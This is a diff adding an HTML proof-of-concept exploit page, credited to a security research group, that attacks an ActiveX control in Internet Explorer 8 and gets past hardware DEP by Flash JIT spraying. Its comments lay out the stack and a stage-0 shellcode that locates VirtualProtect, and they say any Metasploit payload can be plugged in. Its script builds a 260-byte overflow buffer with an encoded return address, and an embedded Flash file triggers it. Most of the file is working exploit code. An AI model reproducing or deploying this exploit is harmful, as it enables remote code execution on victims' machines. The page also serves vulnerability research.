@@ -1,0 +1,133 @@
+<HTML>
+	<HEAD>
+	<TITLE>"DSecRG": ActiveX IE8-hard-DEP Sploit [ActionScript JitSpray]</TITLE>
+	
+	<SCRIPT>
+	
+	</SCRIPT>
+	
+	</HEAD>
+	
+		
+	<BODY>
+	
+	
+	<!--
+		Simple JIT PoC exploit
+// VirtualProtect() stage-0 shellcode used
+//
+//        how to use stack
+//
+//      0000: 0x1111111   	-- ret addr to JIT satge0 shellcode
+//      0004: 0x60616f62   	-- pointer on string atom (encoded high) if ret
+//      0008: 0x60616f62   	-- pointer on string atom (encoded high) if ret 4
+//		000c: 0x60616f62   	-- pointer on string atom (encoded high) if ret 8
+//		0010: 0x6a616061   	-- pointer on string atom (encoded low)
+//		0014: 0x6a616061   	-- pointer on string atom (encoded low)
+//		0018: 0x6a616061   	-- pointer on string atom (encoded low)
+//
+//   Thiss JIT shellcode find VirtualProtect, restore address of shellcode
+//   Make mem exec and jump to it.
+//	 this is used for non ASCII, null and RF bytes encoding
+//	
+//
+//   Restore function:
+//	 ((high-0x60606060)<<4)+(low-0x60606060)
+//   So 0x0a11f021 - original address.
+// 
+//   For shellcode in string use FastShellcode.pl - any payload cann be added from MetaSploit
+//
+//  By Alexey Sintsov
+//	dookie@inbox.ru
+//	a.sintsov@dsec.ru
+//
+//	DSecRG - Digital Security Research Group [dsecrg.com]
+//
+//	
+
+
+	-->
+	
+	<SCRIPT>
+	
+	var buf="";	 
+	const BUFF=260; // Length of buf before RET
+	
+	function decimalToHex(d,l,rad) {
+		var hex = Number(d).toString(rad);
+		while (hex.length < l) {
+			hex = "0" + hex;
+		}
+		return hex;
+	}
+
+	//Called from Flash
+	function exploit2(targetValue){
+		var bf=unescape("%63"); //сссссс...260...cccccc
+			
+		var value=targetValue;
+		
+		value=decimalToHex(value,8,16);
+		//We need to mask 00 bytes and bytes >0x7c 
+		//So here is alfa address encoding in low bytes in two words
+		var h11="%6"+value.substring(0,1);
+		var h12="%6"+value.substring(1,2);
+		var h21="%6"+value.substring(2,3);
+		var h22="%6"+value.substring(3,4);
+		var h31="%6"+value.substring(4,5);
+		var h32="%6"+value.substring(5,6);
+		var h41="%6"+value.substring(6,7);
+		var h42="%6"+value.substring(7,8);
+		
+		var high=h41+h31+h21+h11;
+		var low =h42+h32+h22+h12;
+		
+				while (buf.length<BUFF) buf=buf+bf;
+		
+		buf+=unescape("%0a%0a%1a%1a"); 			//ESI -- points on NULLS
+		buf+="ffff"+unescape("%01%01%1a%1a");	// Return address = 0x1a1a0101 - JIT Stage-0
+		buf+=unescape(high); 	 //if ret					
+		buf+=unescape(high); 	 //if ret 4	
+		buf+=unescape(high);     //if ret 8	(in emsmtp.dll ret 8)	
+		buf+=unescape(low); 
+		buf+=unescape(low);	
+		buf+=unescape(low); 
+		
+		
+		alert('Try me on 0x'+decimalToHex(targetValue,8,16)+' :-)');
+		//HERE IS VULN
+		
+		//Example:
+		//vuln.SubmitToExpress(buf);
+      	
+	}
+	
+	//Called from FLASH
+	function exploit(targetValue){
+			setTimeout('exploit2('+targetValue+')',3000);
+		}
+		
+	
+	
+	</SCRIPT>
+<center>	
+	<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
+             id="Loadzz1" width="320" height="300"
+             codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
+         <param name="movie" value="jit-spray.swf" />
+         <param name="quality" value="high" />
+         <param name="bgcolor" value="#c11c17" />
+         <param name="allowScriptAccess" value="always" />
+		 <param name="allowNetworking" value="all" />
+         <embed src="jit-spray.swf" quality="high" bgcolor="#c11c17"
+             width="320" height="300" name="Loadzz1" align="middle"
+             play="true" loop="false" quality="high" allowScriptAccess="always" 
+			 allowNetworking="all"
+             type="application/x-shockwave-flash"
+             pluginspage="http://www.macromedia.com/go/getflashplayer">
+         </embed>
+     </object>
+</center>
+		
+</BODY>
+</HTML>
